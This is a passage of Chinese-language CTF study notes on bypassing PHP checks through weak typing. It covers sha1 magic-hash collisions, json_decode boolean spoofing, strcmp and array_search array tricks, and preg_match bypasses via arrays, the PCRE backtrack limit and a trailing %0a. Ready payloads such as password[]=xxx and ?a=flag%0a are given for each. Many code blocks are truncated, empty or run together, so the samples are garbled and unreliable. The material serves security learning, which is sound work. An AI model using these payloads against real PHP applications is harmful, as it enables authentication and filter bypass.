break;
}
}
print('b=0e'.$i.'024452&c=0e'.$j.'48399');
?>
// b=0e652024452&c=0e603448399
```
### shal
```php
if(sha1($v1)==sha1($v2) && $v1!=$v2){
// aaroZmOk
// aaK1STfY
// aaO8zKZF
// aa3OFF9m
```
---
## 布尔欺骗
当存在 json_decode 和 unserialize 时，部分结构会被解释为 bool 类型，会造成欺骗
```php
key == $key) {
        echo "flag";
    }
    else {
        echo "fail";
    }
 }
 else{
     echo "~~~~";
 }
?>
```
输入一个 json 类型的字符串，json_decode 函数解密成一个数组，判断数组中 key 的值是否等于 $key 的值，但是 $key 的值我们不知道，但是可以利用 0=="admin" 这种形式绕过
最终 payload message={"key":0}
---
## 数字转换欺骗
```php
var_dump(intval('2'))               # 输出为 int(2)
var_dump(intval('3bc'))             # 输出为 int(3)
var_dump(intval('abcd'))            # 输出为 int(0)
#intval() 用于获取变量的整数值
var_dump(0.9999999999999999999==1)  # 输出为 true
```
```php
 0 如果两者相等 返回 0
```php
```
我们是不知道 $password 的值的，题目要求 strcmp 判断的接受的值和 $password 必需相等，strcmp 传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢
我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等
payload: password[]=xxx
---
## switch 绕过
```php
```
switch() 其中 `()` 内的值会被弱类型转换
---
## array_search is_array 绕过
```php
```
先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和 admin 相等，并且将每个值转化为 int 类型，再判断传入的数组是否有 admin，有则返回 flag
payload test[]=0 可以绕过
下面是官方手册对 array_search 的介绍
`mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )`
$needle，$haystack 必需，$strict 可选  函数判断 $haystack 中的值是存在 $needle，存在则返回该值的键值 第三个参数默认为 false，如果设置为 true 则会进行严格过滤
```php
 返回键值0
var_dump(array_search("1admin",$a));    // int(1) ==>返回键值1
?>
```
array_search 函数 类似于 == 也就是 `$a=="admin"` 当然是 `$a=0` 当然如果第三个参数为 true 则就不能绕过
---
## preg_match 绕过
**数组绕过**
preg_match 只能处理字符串，当传入的 subject 是数组时会返回 false
**PCRE 回溯次数限制**
```php
].*/is', $data);
}
if(!is_php($input)) {
    // fwrite($f, $input); ...
}
```
pcre.backtrack_limit 给 pcre 设定了一个回溯次数上限，默认为 1000000，如果回溯次数超过这个数字，preg_match 会返回 false
```py
import requests
from io import BytesIO
files = {
  'file': BytesIO(b'aaa].*/is', $data);
}
if(is_php($input) === 0) {
    // fwrite($f, $input); ...
}
```
**换行符**
`.` 不会匹配换行符，如
```php
if (preg_match('/^.*(flag).*$/', $json)) {
    echo 'Hacking attempt detected';
}
```
只需要
```
$json="\nflag"
```
而在非多行模式下，`$` 似乎会忽略在句尾的 `%0a`
```php
if (preg_match('/^flag$/', $_GET['a']) && $_GET['a'] !== 'flag') {
    echo $flag;
}
```
只需要传入
```
?a=flag%0a
```